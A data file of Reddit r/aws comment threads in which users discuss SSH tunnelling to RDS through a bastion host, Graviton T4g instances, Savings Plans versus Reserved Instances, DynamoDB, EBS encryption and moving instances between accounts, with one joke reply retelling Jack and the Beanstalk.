g5cik4m,it5tcp,"I assume your RDS is in a DB subnet group that is behind private subnet and will also assume that you have a bastion host to reach your servers in your private subnets.  If that's the case, then I suggest you create a socket:

    ssh -M -S /tmp/my-db-socket -fnNT -L 3306:[RDS_ENDPOINT]:3306 [USER]@[BASTION_HOST]

You can look up options in detail if you'd like, but basically this will create a control socket (-S /tmp/my-db-socket) and forward/bind (-L) your local port 3306 to your RDS_ENDPOINT:3306 via the bastion.  Once this is established, you should be able to connect from your local machine to the RDS vis ""localhost"" as it will get forwarded. 

When you're done, you'll have to exit/clean up the control socket file:

    ssh -S /tmp/my-db-socket -O exit [USER]@[BASTION_HOST]",6.0
g5cmilq,it5tcp,"This is what I do, but with access over TCP only (no socket). 

Is there an advantage to doing this over a socket vs just using a straight SSH port forward. Having to worry about cleaning up that socket file seems like an extra step on the local machine.",2.0
g5cto90,it5tcp,"Completely off topic, but can I configure SSH to work with IAM credentials?",1.0
g5jzg8q,it5tcp,"You can use SSM, it will allow you to SSH to EC2 instances and do port forwarding using your AWS identity",1.0
g5cfcqp,it5tcp,"Some possibilities focusing on the low-cost aspect:

What do you have that currently talks to the RDS instance? If you have an existing EC2 you could configure it to allow SSM to do port forwarding or use SSH to get to the RDS.

Are these manual tasks repeatable? You could script it into whatever you already have, which IMO should be the goal, maturing the ""manual editing"" into a repeatable, codified thing.

You could also keep an EC2 behind an ASG that's normally scaled to 0 and only scale it up when you need to access it. StepFunctions can help manage this, e.g. scale it up and then down after a certain time to save costs.

FWIW you don't need to open it to the whole internet, you can limit access to your current IP via the Security Group. I'd definitely recommend another solution though.",2.0
g5d1xle,it1lzo,"Which AMI are you using?  

I checked multiple listed here and i can see t2 is an option 

https://bitnami.com/stack/wordpress/cloud/aws/amis",1.0
g5cfg64,it0xtz,"If it's not stated there, there isn't one that public available. If your usage is big and you already pay for enterprise support, look into their enterprise discount program",1.0
g5ckkx9,it0xtz,"If your bill isn’t six digits a month, you are highly likely not going to qualify for any volume discounts. That’s a rough estimate but close enough.",1.0
g5fkh1r,it0xtz,"Talk with your TAM their job is to save you money.  For smaller accounts check our ""reserved instances""",1.0
g5ce1z2,it5k8t,"Estimate the cost for your storage solution. Configure a cost estimate that fits your personal needs with Amazon S3. Try out the AWS Pricing Calculator.
This link can be usefull:
https://aws.amazon.com/s3/pricing/",1.0
g5cegpa,it5k8t,S3.,1.0
g5dq1ve,it5k8t,this is the answer,0.0
g5fitz4,it5k8t,"Depends on how their solution accesses data...

- s3 serialized object

- efs file share

- ebs mountable disk

- etc.",1.0
g5c2rt2,it3xye,"Why in the world would you restore a large mssql in a container? Spin up an ec2 instance with sql installed. Restore the DB, do what you got to do, terminate instance.",4.0
g5c350y,it3xye,"You’re probably right. I’ve spent way too long trying to make this docker/fargate method work. I was feeling a bit reserved about going the ec2 path as every other part of this application is serverless and pretty easy to manage. I’ll check this out more, thank you!",1.0
g5c63r4,it3xye,Are you dependent on mssql for the application overall? I was under the impression that it was a one time data extract type scenario. Id look into getting off of mssql and then you can use aurora serverless. You can use the schema conversion tool for this as well,2.0
g5c7ld5,it3xye,"It’s a data conversion application, where clients will give us their .bak files so we can convert all their data at once. It is a one and done per client, the intention is to extract what we need as json and only have to refer back to that if needed",1.0
g5c5tyn,it3s90,solution: switch to classic interface you'll be able to do the task. Why would I pay thousand dollars a month for this?,1.0
g634y0x,it3s90,"Thanks  


I mean you can switch, but this doesn't help editing and viewing already existing metric filters out there.   


This seems to be a bug and I can see people experiencing the same thing on SO  


On top, it suggests to quote it because of ""?"" question marks, which in turn only makes it worse :)   


If you quote it will not be ""OR"" statement and will not be triggered, though saved successfully",2.0
g6385wd,it3s90,"Yes, if you double quote and try to test on the same pattern, OR doesn’t work. Amazon should fix this and stop giving nonsense suggestion, took me some hours to find out.",2.0
g5droph,it26z2,"you can get 'instant feedback' with either RDS or DDB...a lot of this boils down to how your data is architected.

That being said, DDB will generally provide lower, consistent response times.  The downside is that you'll need to know the query patterns in advance to build the table and GSIs that best serve these patterns.",3.0
g5dudto,it26z2,"DynamoDB is really fast, reliable, scalable, and most uses do not require DAX (which can be expensive). It is the perfect complement to Lambda or EC2, ECS, Kubernetes, etc. There are very good reasons  why [Amazon.com](https://Amazon.com), Netflix and countless others rely on it for critical customer facing views.

However, you will no longer have a general purpose query facility. Sure the APIs allow you to find things but only very well planned and defined access patterns will perform well for any significant amount of data. This is because there is only very limited ways to avoid a data scan. However, if the database is truly very small then scanning might not be a major issue.

One tip I can give you is that there are some database design patterns that have been created that will allow you to go beyond some of the limitations of the limited data access patterns. These techniques are not obvious or intuitive to beginners. Essentially, over time some really smart people have figured out how to pack more information into access keys and also they have learned to take advantage of the flexibility allowed in data layouts. So, in some cases you will want to use more DynamoDB tables and relate data in your own code but in most other cases, the clever dynamodb data architects will solve these challenges by packing more information into keys (essentially creating compound keys by packing into a single key) and often many data entities are stored into a single table (which is strange to see at first.)  This table will contain what would have ordinarily been modeled as several tables in the relational database world. This is one of the core secrets to getting more out of databases like DynamoDb.  Google ""Alex DeBrie DynamoDB database design"" for a much better explanation than what I can provide. Also check out these resources  :

[https://dynobase.dev/dynamodb-tutorials/](https://dynobase.dev/dynamodb-tutorials/)",2.0
g5bt4ik,it26z2,"DynamoDB is super fast, plus you can do OnDemand, so you basically only pay for what you use.  So when your site isn't getting traffic its free basically and it scales as you need it.",1.0
g5ctaez,it26z2,"I agree with 2fast2nick. Also, if you know what the queries will be you could also use DynamoDB DAX.",1.0
g5dm9ap,it26z2,"Typically NoSQL databases will be faster than your RDS flavours. However, you can compensate with something like RDS proxy or Elasticache.",1.0
g5bvs1q,isz4qd,Sounds like you're looking for AWS API Gateway. It supports keys out of the box.,3.0
g5fjvx1,isz4qd,"30 sec timeout is painful for legacy systems, but service integrations are awesome",2.0
g5fjqeh,isz4qd,"Azure, aws, (and most likely gcp) expose static virtual ip, elastic adaptors, and load balancers.

Create these as appropriate with firewall policy to deny all traffic except self to self.  You can mount these to whatever makes sense to scenario.",1.0
g5b74og,isyenp,"Cross account support is not permitted. It's for your security and privacy. That ensures that no one else who finds your account number can open a support case to get information you would rather not share.

How much is the monthly spend excluding support in each account? Have you taken full advantage of Trusted Advisor to look for cost savings opportunities?",4.0
g5b7bjm,isyenp,"&gt;It's for your security and privacy. That ensures that no one else who finds your account number can open a support case to get information you would rather not share.

Even if the two accounts are in the same AWS organization?",1.0
g5b7q67,isyenp,Even if.  What if you were reselling AWS services under your organization?  You wouldn't want them talking about what's in another account to clients,3.0
g5b85db,isyenp,"Ah, that makes sense. Bummer. I think I'll just drop the v1 account to Developer support, and keep v2 at Business since there's way more activity there anyway. Thanks!",1.0
g5b7scu,isyenp,Yes. Organizations can include different business units who don't necessarily want to share all details with others.,3.0
g5fdry7,isyenp,"There are two reason that I can think of for business support.

1. The “easy button”. I just really don’t want to figure something out and I just want to talk to live chat. 

2. There is a service level issue in production. 

If any developer has any problem where they could save an hour or two of research in a month, business support is well worth it for #1 for $100. 

I worked in the “real world” [1] for a little bit over 2 years for a small company as a de facto cloud architect that used a lot of AWS services, and we never had a case for #2 that wasn’t a service outage where support could have helped. That’s not to say don’t get it in a production account, $100 is cheap insurance. 

[1] I now work as a consultant at AWS where the issue is kind of irrelevant.",1.0
g5b4a1u,isy2u3,How long ago did you purchase your domain through Route53?,2.0
g5b4p7u,isy2u3,Roughly about 5 months ago. Never used it before though.,1.0
g5bb6gn,isy2u3,"OK, so the DNS records have already propagated.

I had similar issues before with one of my domains, but I can't for the life of me remember how I fixed it. I can check after work - since I run my resume site on Amplify currently and it generated an SSL cert without issue.",2.0
g5bdgmr,isy2u3,"I found the problem. The name servers on my hosted zones did not match the name servers on my domain. I edited the name servers on my domain to match the ones on the name servers and now it is working! 
Thank you for your help regardless. You pointed me in the right direction :)",2.0
g5cap0l,isy2u3,Good to know!,2.0
g5bbs83,isy2u3,Please let me know! I would greatly appreciate it! I can’t for the life of me seem to find an answer anywhere lol.,1.0
g5dnzk6,iswuor,You don’t need to go S3 to Sns you can set triggers on The S3 bucket to trigger a Lambda Job to scrape text out of the PDF. As you’re a JS guy I found links here: https://stackoverflow.com/questions/17424639/extract-text-from-pdf-file-using-javascript you probably want to store the extracted string somewhere (say in an SQS queue). If you’re building a website you can probably query the stores text via REST API. Hope that helps.,1.0
g5b32ge,iswozm,"Not about your question specifically, but just about managing environments at larger scale in general.

Systems Manager Patch Manager / Explorer, SSO, CloudFormation (Stacks), AWS Organizations to setup Cloudtrail across all accounts.

If youve got Enterprise Support then engage your TAM for some of their insights. If you’re on Business Support, engage your Account Manager and setup a one-two hour call with your AWS SA.",2.0
g5bv09c,iswozm,"If you're using AWS SSO you don't need to use aws-vault. 

AWS SSO can do something similar with AWS CLI 2. 

Some of the team I'm in use aws-vault now but we'll switch to AWS CLI2 when we have AWS SSO setup.

We manage 100+ accounts using terraform and python. We use lambdas and AWS batch for running the python scripts across all our accounts. 

Do you have an org over all your accounts?",1.0
g5de6t3,iswozm,"Can you let me know what you are referring to with aws cli v2?  

We do have Org and there are a few Permission Sets but they are not applied consistently...I guess that's probably the first thing I need to straighten out.  Anything to watch out for their from your experience?",1.0
g5en30k,iswozm,"https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-sso.html

https://aws.amazon.com/blogs/developer/aws-cli-v2-now-supports-aws-single-sign-on/

Then you can choose which account to use. 

We've only used this on our test org with the test accounts there. 

We've been waiting for the AWS SSO API which was released a few days ago before setting this up on our production or and accounts there. 

The API is here :

https://docs.aws.amazon.com/singlesignon/latest/APIReference/welcome.html

There is also a boto 3 API 

https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/sso-admin.html#id38",1.0
g5auz77,isvuym,That's awesome. I have been wanting to test if I can migrate to an arm machine and what downsides it would bring. Thanks for posting this,12.0
g5b3jue,isvuym,"Just migrated an Ubuntu instance and it just worked.  Didn't have to change anything besides the AMI.  I haven't used the ARM ecosystem before, so far I'm impressed.",8.0
g5b0awe,isvuym,Is there a release date for sa-east-1?,6.0
g5b33z6,isvuym,"Like always, AWS will publicly announce the release date for the product on the day they release the product.",17.0
g5b3nxc,isvuym,And sa-east-1 will be the last region to receive it :(,6.0
g5bkzis,isvuym,Open a support case asking for it.  The cse should either +1 you on the feature request or create one for you,1.0
g5elsbq,isvuym,Nothing makes a cse as happy as feature request cases,1.0
g5c9ut3,isvuym,"Anyone here actually running Graviton 2 in production?

What's the compatibility like with most Node.js &amp; Python libraries?  Any issues to be aware of?",5.0
g5en2nn,isvuym,"I've found for most node stuff, it's fine - if you use any native bindings via node-gyp or the like, you just have to build on an ARM architecture, but this is pretty easy.

The one that i've found was a bit of an issue trying to build was a parquet library, where the lzo package just wouldn't build, but a few changes to my environment fixed that.

I've been using it for some production workloads that have just come straight from x86, some requiring just a new npm install to be run, others with no changes necessary.",2.0
g5eph31,isvuym,"Could you share a bit more about what changes you needed to get your lzo package to build? If there are changes that could make the process more simple for others, we have folks that can help make them in the upstream open source packages.",1.0
g5erofj,isvuym,"Apologies, I used the word environment incorrectly there - the build issue I was having was actually fixed in a new release of the package (back in December 2018).

It just happened to be that I had to use an older version of the package (for unrelated reasons, I can't just update the package that depends on it).

The workaround in the end was to just fix to version 0.4.10 of the lzo npm package, in my own package.json, and hope that it worked when building for ARM, and it did.",2.0
g5fxpm4,isvuym,I've noticed one annoying (but manageable) thing with installing Python libs is that the package index doesn't currently have many (any?) prebuilt wheels for aarch64. I assume this will change as adoption increases but in the meantime it makes building Python containers take way longer than on the x86\_64 counterparts. It also means having to add compilers to your build process that may not have otherwise been needed.,1.0
g5b46fl,isvuym,"This is perfect timing, I was just about to move some stuff over to T3As... and now it'll probably go onto T4Gs and save a bit of cash. The free trial for the rest of the year is fantastic too.

I'd love to see these become available as RIs - though I'm sure we'll see that in due course.

Edit: Figured as much, just had to wait a few hours. RI pricing is up now.",3.0
g5blfk1,isvuym,There is always savings plan in the mean time.,4.0
g5bqdrh,isvuym,"That's a good point, though frankly Savings Plans confuse me (and the people at work who have decision making authority over this kind of thing). Are there any good resources that will help explain it?",3.0
g5cua8d,isvuym,"I mostly use analogies for those. 

Consider your car and buying fuel. Normally you have a set fuel price, let's say 1€ per liter. 

Now the gas station offers a ""plan"". If you drive 30km/h consistently forever, then you'll only pay 0,66€ per liter instead of 1€ per liter. However, any more than 30kmh and that extra fuel consumption is gonna cost you 1€/liter. 

So if you drive 45kmh for an hour then you'll pay 0,66€/liter for the 5l/100km fuel consumption at 30kmh, and 1€/liter for the 2l/100km *extra* fuel consumption that you had because you drove faster.

If you drive *less* than 30kmh consistently, then you'd still have to buy fuel as if you had driven that.",2.0
g5dwelx,isvuym,"Good analogy. You definitely don't get the same level of savings but it is so much easier and covers more compute types I've typically seen better savings from it.

The ReInvent deep dive video on it is pretty good as well: [https://www.youtube.com/watch?v=uQ9ry-9uUvo](https://www.youtube.com/watch?v=uQ9ry-9uUvo)",1.0
g5b2ylg,isvuym,"On May 11th, you have [announced the general availability of M6g and C6g](https://aws.amazon.com/blogs/aws/new-m6g-ec2-instances-powered-by-arm-based-aws-graviton2/) instances. Four months later, and these instances are still not available for use on ElasticBeanstalk.

How long before we can expect T4g to be available for general use through ElasticBeanstalk? Is 6-12 months a reasonable timeframe? Just doing some RI planning. 

Just our of curiosity, why are the new instances never available on EB? What difference does it make if I spin the instance directly or through EB?",6.0
g5c77fm,isvuym,I’d suggest researching savings plans. I would never inflict RIs on an ec2 user in 2020. You get the same discounts but more flexibility,5.0
g5chqvh,isvuym,"&gt;You get the same discounts but more flexibility

Incorrect. The savings are NOT the same. For example. T3.small RI all upfront standard 3-year term is 62% savings while the same instance Saving Plan is only 55%.

While the 7% savings may not mean much to most when you are on a budget, and already invested in RI, it is not that easy to switch to the Savings Plan.

But my main point was the new instances are not available on EB even 6-12 months after the release.",5.0
g5drpha,isvuym,"A Standard RI has the same discount as the EC2 Instance Savings Plan.

A Convertible RI has the same discount as the Compute Savings Plan.",3.0
g5e86m7,isvuym,"&gt;A Standard RI has the same discount as the EC2 Instance Savings Plan.

Incorrect. The savings are NOT the same. At least US-East is not. For example, T3.small RI all upfront standard 3-year term non-convertible that I use is 62% savings while the same instance Saving Plan, 3-year all upfront savings plan is only 55%.

As far as I can tell: 55 != 62",0.0
g5ej8is,isvuym,"If I go [here](https://aws.amazon.com/savingsplans/pricing/), click the ""EC2 Instance Savings Plans"" tab on the far right, then choose from the drop-downs ""3 years,"" ""All Upfront,"" ""t3"", and ""US East (N. Virginia)"", and ""Linux"" and ""Shared"", I am seeing 62% and 63% savings.

It looks like [this](https://imgur.com/a/40EHyr7).",3.0
g5erlsi,isvuym,"Hmm, so it’s actually slightly higher saving on the savings plan, 63% vs 62% for a small. I take it back, the savings aren’t the same. Sometimes they’re better.",2.0
g5el3xv,isvuym,"Well, yes and no. EC2 Instance saving plan is just another way of looking at reserved instances as you are stuck with T3 and there is no benefit of doing this as you cannot convert to a different instance type.

With RI, I can sell those and move on to another instance type, but you cannot sell the pre-paid ""EC2 instance savings plan"".

Therefore, the only option is to get the ""compute savings plan"" which again is just another way of looking at the same convertible instance discount at 55%.

Bottom line: RI provide 63% savings and can be re-sold. The ""EC2 instance saving plan"" offers similar savings, without the re-sell option. The convertible ""Compute Savings Plan"" offers only 55% savings.",0.0
g5erb6i,isvuym,"*62%. The savings plan is 1% higher discount. Also you can only sell them in the US with a US bank account, and you lose a percentage on the cost. For all people outside of the US that means RIs are essentially not able to be sold.",2.0
g5erqix,isvuym,Fair enough. I'm in the US so I may sell those RI and convert to the savings plan once the timing is right.,2.0
g5eryfk,isvuym,"Yeah, it’s marketed as though they can be sold. And those details are in the fine print. So I see it a bit here in Australia where people want to sell them and then realize that catch.",1.0
_,isvuym,,
g5cjcpm,isvuym,We can capitalize 3 year RIs vs savings plans that would be pure OPEX. So for us it’s a worth being inflexible,1.0
g5er4d1,isvuym,You can do 3 year upfront savings plans too. What is the benefit to an RI?,2.0
g5ba17e,isvuym,"To answer this, it helps to understand the underlying architecture of ElasticBeanstalk.  You see, one day, Jack’s mother told him to sell their only cow. Jack went to the market and on the way he met a man who wanted to buy his cow. Jack asked, “What will you give me in return for my cow?” The man answered, “I will give you five magic beans!” Jack took the magic beans and gave the man the cow. But when he reached home, Jack’s mother was very angry. She said, “You fool! He took away your cow and gave you some beans!” She threw the beans out of the window. Jack was very sad and went to sleep without dinner.

The next day, when Jack woke up in the morning and looked out of the window, he saw that a huge beanstalk had grown from his magic beans! He climbed up the beanstalk and reached a kingdom in the sky. There lived a giant and his wife. Jack went inside the house and found the giant’s wife in the kitchen. Jack said, “Could you please give me something to eat? I am so hungry!” The kind wife gave him bread and some milk.

While he was eating, the giant came home. The giant was very big and looked very fearsome. Jack was terrified and went and hid inside. The giant cried, “Fee-fi-fo-fum, I smell the blood of an Englishman. Be he alive, or be he dead, I’ll grind his bones to make my bread!” The wife said, “There is no boy in here!” So, the giant ate his food and then went to his room. He took out his sacks of gold coins, counted them and kept them aside. Then he went to sleep. In the night, Jack crept out of his hiding place, took one sack of gold coins and climbed down the beanstalk. At home, he gave the coins to his mother. His mother was very happy and they lived well for sometime.

Jack and the Beanstalk Fee Fi Fo Fum!Climbed the beanstalk and went to the giant’s house again. Once again, Jack asked the giant’s wife for food, but while he was eating the giant returned. Jack leapt up in fright and went and hid under the bed. The giant cried, “Fee-fifo-fum, I smell the blood of an Englishman. Be he alive, or be he dead, I’ll grind his bones to make my bread!” The wife said, “There is no boy in here!” The giant ate his food and went to his room. There, he took out a hen. He shouted, “Lay!” and the hen laid a golden egg. When the giant fell asleep, Jack took the hen and climbed down the beanstalk. Jack’s mother was very happy with him.

After some days, Jack once again climbed the beanstalk and went to the giant’s castle. For the third time, Jack met the giant’s wife and asked for some food. Once again, the giant’s wife gave him bread and milk. But while Jack was eating, the giant came home. “Fee-fi-fo-fum, I smell the blood of an Englishman. Be he alive, or be he dead, I’ll grind his bones to make my bread!” cried the giant. “Don’t be silly! There is no boy in here!” said his wife.

The giant had a magical harp that could play beautiful songs. While the giant slept, Jack took the harp and was about to leave. Suddenly, the magic harp cried, “Help master! A boy is stealing me!” The giant woke up and saw Jack with the harp. Furious, he ran after Jack. But Jack was too fast for him. He ran down the beanstalk and reached home. The giant followed him down. Jack quickly ran inside his house and fetched an axe. He began to chop the beanstalk. The giant fell and died.

Jack and his mother were now very rich and they lived happily ever after.",15.0
g5baqta,isvuym,You are insane. Love it.,3.0
g5bf40a,isvuym,"The real question is why bread and milk? Cookie and milk makes sense. Bread and soup also makes sense. 

Also what does this have any thing to do with AWS elasticbeanstalk",3.0
g5c36d1,isvuym,Moral of the story: thievery and murder can be a great way to get what you want?,1.0
g5azvyt,isvuym,Linux + Arm... Naisuuuu,2.0
g5bl1yk,isvuym,What’s naisu,2.0
g5bnk7w,isvuym,nice,4.0
g5bvuo3,isvuym,Oh... Naaaiiiiiccccceeeee!,3.0
g5drw8p,isvuym,ナイース ?,1.0
g5cbe48,isvuym,I hope the t4gd instances become available in the next six months.,1.0
g5cx2rk,isvuym,I don't expect them to ever release that. there aren't any t3d so why would there be a t4gd?,1.0
g5dg44h,isvuym,To give the t4g instances a competitive advantage over all the other T instance families?,1.0
g5dk8eb,isvuym,I don't see the use case. It would just end up as a spot pool for me. the c6gd.medium already exists as well.,1.0
g5f5rce,isvuym,I’m holding out for them adding NVidia 3090 GPUs and wireless AC,1.0
g5dhh8o,isvuym,Anyone has a benchmark?,1.0
g5dt0y7,isvuym,"It's too early for T4g but Phoronix made it for M6g

[https://www.phoronix.com/scan.php?page=article&amp;item=epyc-ec2-c5a&amp;num=1](https://www.phoronix.com/scan.php?page=article&amp;item=epyc-ec2-c5a&amp;num=1)",1.0
g5f00ht,isvuym,Is t3.medium still the way to go for overall web apps in general ?,1.0
g5k3gmm,isvuym,"https://www.vpsbenchmarks.com/compare/performances/web_runs?selected_plan_ids=309%2C77%2C168

They show lower latency and 2x the requests/s",1.0
g5kllt8,isvuym,"From what I'm reading, they seem to be performing much better as a web server thanks to their bursting abilities, but much much worse than t3 for constant tasks. Do you see the same ?",1.0
g5nx6jq,isvuym,Make sure your running in unlimited mode on both types.,1.0
g5ajtug,isulkr,https://aws.amazon.com/blogs/aws/new-t4g-instances-burstable-performance-powered-by-aws-graviton2/,4.0
g5aogfd,isulkr,Can someone explain a bit about graviton. I’ve heard from others that it has specific uses and you can’t run just anything on it. Is that true?,2.0
g5aqkr1,isulkr,"It's an Arm architecture. I started using one myself for a dev box a while back; I had to recompile a few things that hadn't been updated yet, but today it's pretty much invisible; all of those things are now updated. 

There's remarkably little downside; if your code doesn't work on it you'll know in a hurry.",4.0
g5aqo1p,isulkr,"Graviton runs ARM64 instructions instead of x86-64 instructions. Programs have to be compiled for one instruction set or the other. Open-source programs (such as Linux, Python, Apache, MySQL, or Postgres) can typically be compiled for either one, but some software (such as Windows and SQL Server) is sold or licensed as pre-compiled binaries, and that software will only run on a CPU that runs the instruction set that the binaries were compiled for.",3.0
g5b0sy9,isulkr,And about docker images? Will run well?,1.0
g5baylb,isulkr,"Docker itself runs very well on ARM / ARM64. Docker images typically contain compiled code, so the same caveats apply: if the code inside the container is compiled for x86-64 then it will only run on an x86-64 processor, likewise ARM.

Docker Hub supports many architectures, here are the public ARM64 images: https://hub.docker.com/search?architecture=arm64&amp;source=verified&amp;type=image

The number of public images for ARM64 is several orders of magnitude smaller than there are for x86-64, but it's an industry transition that is well underway. The ""library"" containers for the most important things you need, like Go, Node, Ruby, Python, and basic Linux images like Alpine, Debian, Ubuntu, Red Hat, Fedora, etc. are all available in ARM64 already.

Docker Desktop supports cross-compiling the same Dockerfile to architectures other than the one in your local development machine: https://www.docker.com/blog/multi-arch-build-and-images-the-simple-way/

As above, this is still not super easy and has some pitfalls, but the issues are getting worked through as ARM64 adoption continues.",5.0
g5a98ut,istvzz,Depends on what you're migrating. Are you asking about moving an AWS Account from one AWS Organization to another? Or moving a VM from one account to another? Or Moving serverless services like Lambda? Or something else?,1.0
g6p8sqg,istvzz,Just moving the traditional vm,1.0
g5alasr,istvzz,"This seems like an XY problem. The only scenario I can see this being necessary in is where a business relationship is changing and the business parties share an AWS account. Like an MSP managing multiple customers in the same account, or a company selling off part of their business. If thats the case your best bet is probably careful manual migration resource-by-resource. If there is a bunch of cookie cutter resources (like 100 EC2 VMs) you could probably script snapshot creations, sharing, volume creation, instance creation, etc. But you gotta know your edge cases.",1.0
g5aw58y,istvzz,"Are you only looking to move EC2 instances? If so, it's feasible but I don't know of any commercial software. I automated this a while back but can't find the script.

If you are willing to automate yourself, the process looks like this:

1. Stop instance (and poll to wait for it to stop)
2. Image instance (and poll to wait for image to complete)
3. If encrypted with CMK key, share the key. If encrypted with built-in key, copy image to a CMK key that is shared (you can't share the aws/ebs key). Wait for copy to complete.
4. Record the ImageID
5. Share image and snapshot
6. Record relevant information that may be important (availability zone, instance size, IP address, tags, etc.)
7. Switch role to other account
8. Convert any relevant information captured in step 5 (e.g. desired subnet)
9. Launch instance from ImageID
10. Apply tags

If you are dealing with Windows instances, you will likely also need to fix the static routes to the 169.254.169.\* endpoints as they are created during deploying based on the original VPC configuration.",1.0
g6p8zvf,istvzz,This is good advice. I could not find good documentation to do something like this. I will try it out. Thanks!,1.0
g5bedct,istvzz,"Take a look at https://arpio.io. We’re an AWS DR solution, but we do cross account migrations when customers need them.",1.0
g5pejjd,ista3o,"Well, nevermind, it seems NLB and ELB require different SG settings, but by adding either the subnet or the VPC's SG it worked... but NLB was intermittently failing with curl, so stayed with ELB for now.",1.0
g5alju3,ist2v0,"So all of the Kubernetes secrets stored in etcd are encrypted at the disk level using AWS-managed keys. You can also import your own KMS keys and use that for envelope encryption.

This only encrypts the secrets such as passwords, docker registry credentials or TLS keys.

Security is about managing risk. Depends how sensitive the data is. I would probably move away from hosting the DB on EKS and towards RDS or DynamoDB.

Edit:

There are 3 AWS storage options you can use with EKS: EBS, EFS and FSx. All 3 offer encryption using AES256. 

DynamoDB encrypts each table with a AES256 key and RDS encrypts each instance/snapshot with AES256.

I’m not sure if you are giving up a ton of security using EKS but it does seem like more to manage.",2.0
g5arx2w,ist2v0,"I feel like ultimately they just want to be told that what they are doing is ok and they don't have to redo anything. But from what I've read and what you're saying it sounds like they will, at least on that DB.

I was going to tell them at least as far as the EBS encryption using CMKs managed by KMS that is fine. That sounds like the recommended practice to me anyway?",1.0
g5cpe6x,ist2v0,"Sorry, I just noticed my typo in the title, I mean is EBS volume encryption good enough.

Is there a reason you wouldn't want to host the DB on EKS in the cluster? I can see that running the DB in a managed service like RDS would be a good idea, but are there security concerns?

The data in the DB is mostly financial data from what I understand.",1.0
g5fnvok,ist2v0,They all use AES256 for encryption. There are not any real security concerns with EBS.,1.0
g5c71a9,ist2v0,"If encryption at rest is enough for them, then EBS encryption is good enough.",2.0
g5ceshz,ist2v0,"Thanks!. Is the alternative to also have encryption in transit along with at rest?

Like have the traffic in the cluster just use encrypted protocols and ports, right? Is that where the envelope encryption comes in?",1.0
g5a4z75,isrgmn,"Did you enable [IAM billing access](https://aws.amazon.com/premiumsupport/knowledge-center/iam-billing-access/)

You need the root user for this",5.0
g5a8b6o,isrgmn,This was it! Thank you!,1.0
g59x63c,isrgmn,"Are you **sure** this user is in the group?  AdministratorAccess alone should give you rights to the billing console so it seems that both neither policy is being applied, or there is some other policy assigned to the user/group that has a DENY for these actions.

The only other thing that might be happening is that the user doesn't have console access at all.  When you create/edit a user, you can specify if they should have console access, programatic access, or both.",1.0
g5a711z,isrgmn,"I am absolutely sure my one and only user in in the group.  


Where exactly do I specify console access, programatic access, or both when editing a user?",1.0
g5abhym,isrgmn,"When you create a new user in the console, it's on the first page - you specify the username and their access and you have to choose either programmatic, console, or both.

For an existing user, go to the user in the console and check the Security Credentials tab.  If they don't have console access, you should see ""Disabled"" next to ""Console password"".  Click 'Mange' to enable it.

To manage programmatic access, you simply add or revoke access keys on the Security Credentials tab.",2.0
g5adal4,isrgmn,Cheers. Thank you.,1.0
g642iiz,isqt0s,Looks like Application Load Balancer has path-based routing capabilities.  This works for external requests (outside of the vpc).,1.0
g5aaq8s,isrbo2,Do the udemy course for the aws certificate. Cloud solutions architect.,10.0
g5aq1v0,isrbo2,Starting the solutions architect associate now after finishing my practitioner,2.0
g5d5r49,isrbo2,"I started with SAA. This is a good plan. I have 18 years of IT experience and programming, and had zero in cloud.
  
- Join /r/AWSCertifications 
- Join udemy, buy courses when they are on sale, buy the Stephane Maark courses and the Tutorial Dojo/Jon Bonzo practice tests.  
- Before taking a test, do the official AWS Practice @ home. It's 20 questions for $20. It's just a website, no cameras.",2.0
g5dddu1,isrbo2,I've been doing acloudguru. What do you think?,1.0
g5diwg5,isrbo2,"On /r/AWSCertifications a lot of people say good things.  
  
I like **Stephane Maark's** stuff. That, and he is active on the sub. When SAA-002 came out, he did talk about it a bit on the sub. 

I also recommend you do **DolphinEd's SAA course**.  If you have anxiety about not being knowledgeable, DophinEd will resolve that. It's a long course, but he's holding your hand through all of it and breaking it down.

I also liked Maark's Cloudformation Deep Dive. As well as his Load Balancer Dive. I plan to take his serverless dive when I start DevOps.",1.0
g5e45cn,isrbo2,"Gotcha. I'm currently a BA at a tech consulting firm, and curious as to where I can take this/what roles are feasible from this route?",2.0
g5eai2e,isrbo2,Trying to figure that out myself. Trying to get out of Super Junior Sysadmin and hopefully more into a developer sided position.,2.0
g5edr25,isrbo2,Good luck to us both then,2.0
g5ajjnd,isrbo2,"Take Galcier off the list, except for a page telling you to do the cost benefit analysis of storing 2T of data in s3 vs glacier *and then having to retrieve it*

You can spend exponentially more using Glacier if you have to pull the data once than if you just put it in S3 (even regular redundancy S3). It's not even close.

I use Glacier in exactly one circumstance. Legal holds, because that's a first tier feature.

Cognito is super weird, don't use it unless you know you need to use it. 

Lightsail is a feature parity product (like EKS), if you're looking at Lightsail you're probably better off just going to Digital Ocean.",3.0
g59nqfp,isrbo2,I always suggest cloud formation to provision AWS and third party application resources. My coworker first introduced it to me and I’ve used it for a couple of personal projects.,8.0
g5a3y6e,isrbo2,"I find it to be a bit of a steeper learning curve, but seems worth it in the long run.",3.0
g5dsv24,isrbo2,"I recommend [Stephane Maark's UDemy on Cloudformation.](https://www.udemy.com/course/aws-cloudformation-master-class/learn/lecture/8090772#overview)  
  
Along with videos he gives you resources. You're building an actual infrastructure with an actual service he wrote in Java 8. Instead of pretending this is how a service works in relation to Load Balancing, health checks, ect, Maark has written and gives out those services. A great lead into the developer part of DevOps. And a fundamental  need for SysOps to have experience with.  
  
Also, his examples demystify and flatten the big scary illusion of services. You're going to be surprised at how small and simple it is.  

  
Not saying you need to be the world's best programmer. I am saying you at least have to touch a file a developer wrote and implement it. This course does that. You're the SysOp and Maark created files a  developer would give you.",1.0
g5alvtl,isrbo2,"I'd rather walk over broken glass than use Cloudformation instead of Terraform.

Cloudformation has one fatal flaw. Once you hit a button, you can't stop it. Which is fine if you've kept up with the templates and have had proper handoffs when people get hired or leave. But if one person fucks it up, Cloudformation can become a giant landmine just waiting for someone to step on it.

With Terraform if you realize you've made a mistake halfway through you can break out of it and that's it. With Cloudformation, you just get to watch it burn (or figure out a clever/jankey way to break it's logic, like setting some NAT Gateways to not be cleaned up when you realize it's going to wipe a prod VPC).",4.0
g5bp8li,isrbo2,"This is not true. You can cancel stack updates and it rolls back automatically. Also, VPCs are safe from accidental deletion because you can't delete a VPC that has addresses assigned.",2.0
g5grk1n,isrbo2,It is if it's a stack deletion that you didn't realize had sub-stacks you cared about.,1.0
g5drc48,isrbo2,"Wouldn't it roll back to the previous config in the case of failure? So essentially, you're stuck at something that works until you update to something else that works?",1.0
g5grlag,isrbo2,It was a stack deletion we didn't realize had substacks referenced in it.,2.0
